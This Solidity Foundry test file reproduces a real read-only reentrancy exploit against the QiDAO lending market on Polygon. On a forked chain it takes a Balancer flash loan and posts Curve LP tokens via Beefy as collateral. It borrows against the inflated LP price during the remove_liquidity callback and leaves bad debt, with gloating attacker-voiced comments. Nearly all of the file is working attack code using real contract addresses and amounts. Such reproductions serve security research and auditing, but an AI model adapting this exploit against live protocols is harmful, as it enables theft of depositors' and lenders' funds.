// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";
import {IUniswapV2Router02} from "../../utils/IUniswapV2Router.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
    function borrowCaps(address market) external view returns(uint256);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface IPriceFeed {
    function getUnderlyingPrice(address cToken) external view returns (uint);
}


interface IVault is IERC20 {
    function deposit(uint256) external;
    function depositAll() external;
    function withdraw(uint256) external;
    function withdrawAll() external;
    function getPricePerFullShare() external view returns (uint256);
    function upgradeStrat() external;
    function balance() external view returns (uint256);
    function want() external view returns (IERC20);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint);
    function borrowBalanceCurrent(address) external returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_min_amount, bool use_eth) external payable returns(uint256);
    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts , bool use_eth) external payable;
    function token() external pure returns (address);
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth) external payable returns (uint256);
}



contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
    // The tokens involved in the pool
    IWETH9 WMATIC = IWETH9(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

    // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
    // Curve pools.
    ICERC20Delegator BEEFY_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
    IVault BEEFY = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);

    // QIDAO Compound delegator and underlying
    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
    IERC20 QIDAO = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);

    // Unitroller and price feed used by the unitroller. The attacker does not query
    // the price (they might have precalculated the amounts) but is useful to
    // generalize the test
    IPriceFeed PRICE_FEED = IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);

    // STLidoMatic/WMATIC Curve pool
    ICurvePool constant CURVE_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    IERC20 CURVE_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);

    // UniswapV2Router
    IUniswapV2Router02 router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);

    // Let's store the price of the LP tokens in different moments of the transaction
    // To see how it goes up during the reentrancy and then comes back to normal
    uint256 priceAtBeginning;
    uint256 priceDuringCallback;
    uint256 priceAfterCallback;

    // In reality, the attacker used some minion contracts which they deployed from their
    // main contract to execute the attacks. Here, we simplify and use only one contract
    // and reproduce the attack only to Qi Protocol.
    // The attacker minion address can be found at
    // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
    function setUp() external {
        cheat.createSelectFork("polygon", 34716800); // We pin one block before the exploit happened.
        cheat.label(address(this), "Attacker Contract");
        cheat.label(address(CURVE_POOL), "Curve Pool");
        cheat.label(address(CURVE_LP_TOKEN), "LP Token");
        cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");

        cheat.deal(address(this), 0);
    }

    function test_attack() external {
        // In reality, the attacker requested a flash loan through AAVE
        // first and then through Balancer. This is not terribly important
        // for the attack, so it was left out for simplicity.
        // The difference it makes is that in the actual attack the attacker
        // had 50000000000000000000000000 of stLIDOMATIC because they requested
        // first 15419963467577188022568076 and then 34580036532422811977431924
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(WMATIC);
        _tokens[1] = address(stLIDOMATIC);

        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 34580036532422811977431924;
        _amounts[1] = 19664260000000000000000000;

        console.log("Attacker balance", address(this).balance);

        priceAtBeginning = get_lp_token_price_for_compound();
        console.log("==== INITIAL PRICE ====");
        console.log(priceAtBeginning);
        balancer.flashLoan(address(this), _tokens, _amounts, "");

        console.log("\n==== FLASHLOAN REPAID ====");
        require(priceAtBeginning > priceDuringCallback, "Intial price smaller than during the attack");
        require(priceDuringCallback > priceAfterCallback, "Price during the attack smaller than the ending price");
    }

    event Received(address, uint);
    receive() external payable {
        if (msg.sender == address(WMATIC) || msg.sender == address(stLIDOMATIC)) {
            emit Received(msg.sender, msg.value);
        } else {
            _fallback();
        }
    }

    function _fallback() internal {
        // During the fallback, the LP token price
        // will be broken if we consult `get_virtual_price`
        // Our friends at Qi use this, so we can exploit them
        // Here we should continue the attack: we should send the LP tokens
        // to the borrow platform, which should price them a lot more
        // than they are. Once we get our borrow, repay the flashloan
        // and finish
        priceDuringCallback = get_lp_token_price_for_compound(); //
        console.log("\n==== PRICE DURING THE ATTACK (CALLBACK) ====");
        console.log(priceDuringCallback);

        console.log("--> PRE-QI");
        LOG_BALANCES();

        // Borrow as much as we can and then check that
        // everything went OK with the loan before returning
        // control to the calling function (removeLiquidity)
        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
        require(error == 0, "something happened");
        require(shortfall == 0, "account underwater");
        require(liquidity > 0, "account has excess collateral");

        uint256 maxBorrowUnderlying = liquidity / priceDuringCallback;
        uint256 code = QIDAO_DELEGATOR.borrow(maxBorrowUnderlying * 10**18);
        uint256 borrows = QIDAO_DELEGATOR.borrowBalanceCurrent(address(this));

        console.log("--> POST-QI");
        LOG_BALANCES();


        require(code == 0);
        require(borrows == maxBorrowUnderlying * 10**18);
    }


    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory ,
        bytes memory
    ) external payable {
        // Sensible requires to aid development
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(WMATIC));
        require(address(tokens[1]) == address(stLIDOMATIC));

        console.log("== FLASH LOAN ==");
        LOG_BALANCES();
       
        console.log("--> Starting a position on Compound... Depositing LP tokens into beefy to be used as collateral)...");
        
        // Add to the pool all my WMATIC and stLIDOMATIC, I will
        // receive LP tokens in return
        WMATIC.approve(address(CURVE_POOL), amounts[0]);
        stLIDOMATIC.approve(address(CURVE_POOL), amounts[1]);

        uint256[2] memory addLiquidityAmounts = [amounts[1],
                                                 amounts[0]];
        CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);

        assertGe(CURVE_LP_TOKEN.balanceOf(address(this)), 0);

        // Now, our attacker will start a position on Compound
        // the market is the delegator, and it will deposit
        // LP tokens into beefy to be used as collateral

        // enter the market
        address[] memory markets = new address[](1);
        markets[0] = address(BEEFY_DELEGATOR);
        UNITROLLER.enterMarkets(markets);

        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));

        // deposit into beefy
        uint256 deposit_in_beefy = 90000000000000000000000;
        CURVE_LP_TOKEN.approve(address(BEEFY), deposit_in_beefy);
        BEEFY.deposit(deposit_in_beefy);

        // mint collateral
        uint256 amount_in_beefy = BEEFY.balanceOf(address(this));
        LOG_BALANCES();
        BEEFY.approve(address(BEEFY_DELEGATOR), amount_in_beefy);
        BEEFY_DELEGATOR.mint(amount_in_beefy);

        // we have some lp tokens left over (we did not deposit everything in beefy)
        // use those to remove liquidity from the curve pool and start the attack
        uint256 lp_tokens_now = CURVE_LP_TOKEN.balanceOf(address(this));

        // Let's now remove liquidity, which will trigger our fallback function
        uint256[2] memory minAmounts = [ uint256(0) ,uint256(0) ];
        CURVE_POOL.remove_liquidity(lp_tokens_now, minAmounts, true);

        priceAfterCallback = get_lp_token_price_for_compound();

        console.log("\n==== PRICE AFTER THE ATTACK (CALLBACK) ====");
        console.log(priceAfterCallback);

        // We now acquired a bad debt... good luck recovering your borrowed
        // amount though, liquidate all you want ;)
        (error, liquidity, shortfall) = UNITROLLER.getAccountLiquidity(address(this));
        require(error == 0, "yikes can't get our account liquidity");
        require(shortfall > 0, "i owe you and you will never catch me");
        require(liquidity == 0, "i can't take any more debt but who cares?");

        // We now have to repay the flashloan and be on our way.
        repayLoan(amounts);
    }

    function repayLoan(uint256[] memory amounts) internal {
        // We swap to get the repayment tokens
        QIDAO.approve(address(router), type(uint256).max);

        address[] memory path = new address[](3);
        path[0] = address(QIDAO);
        path[1] = address(USDC);
        path[2] = address(WMATIC);

        console.log("== REPAY ==");
        console.log("--> PRE-SWAP");
        LOG_BALANCES();

        // We request the amount received as no fees were paid for this loan
        uint256 amountIn = QIDAO.balanceOf(address(this));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, path, address(this), block.timestamp); // Qi Tokens for WMATIC

        console.log("--> POST-SWAP");
        LOG_BALANCES();

        WMATIC.approve(address(CURVE_POOL), type(uint256).max);
        CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false);

        console.log("--> POST-EXCHANGE");
        LOG_BALANCES();

        //WMATIC.deposit{value: address(this).balance}();
        // We need to make sure we have the right amounts here.
        // XXX: there might be a problem with the WETH9/ERC20 interfaces
        //      WETH9.transfer() works, but deducts from the contract itself, not the token - address(this).balance
        //      ERC20.transfer() is not working at all. the trace will show as it succeeded, but the balances remain unaffected (both sender/receiver)
        WMATIC.withdraw(WMATIC.balanceOf(address(this)));
        console.log("--> WMATIC WITHDRAW");
        LOG_BALANCES();

        WMATIC.deposit{value: amounts[0]}();
        WMATIC.transfer(address(balancer), amounts[0]);

        console.log("--> WMATIC PAID");
        LOG_BALANCES();

        stLIDOMATIC.transfer(address(this), stLIDOMATIC.balanceOf(address(this)));
        console.log("--> stLIDOMATIC WITHDRAW");
        LOG_BALANCES();

        console.log("--> PAYING LIDOMATIC ", amounts[1]);
        stLIDOMATIC.transfer(address(balancer), amounts[1]);
    }

    // Gets the price of Curve LP tokens (Beefy's underlying) according to the
    // Compound price's feed
    function get_lp_token_price_for_compound() internal view returns (uint256) {
        return PRICE_FEED.getUnderlyingPrice(address(BEEFY_DELEGATOR));
    }

    function LOG_BALANCES() internal view {
        console.log("Curve LP tokens .....", CURVE_LP_TOKEN.balanceOf(address(this)));
        console.log("AMounts in Beefy ....", BEEFY.balanceOf(address(this)));
        console.log("WMATIC balance ......", WMATIC.balanceOf(address(this)));
        console.log("stLIDOMATIC balance .", stLIDOMATIC.balanceOf(address(this)));
        console.log("QI balance ..........", QIDAO.balanceOf(address(this)));
        console.log("Attacker balance ....", address(this).balance);
        console.log("");
    }
}
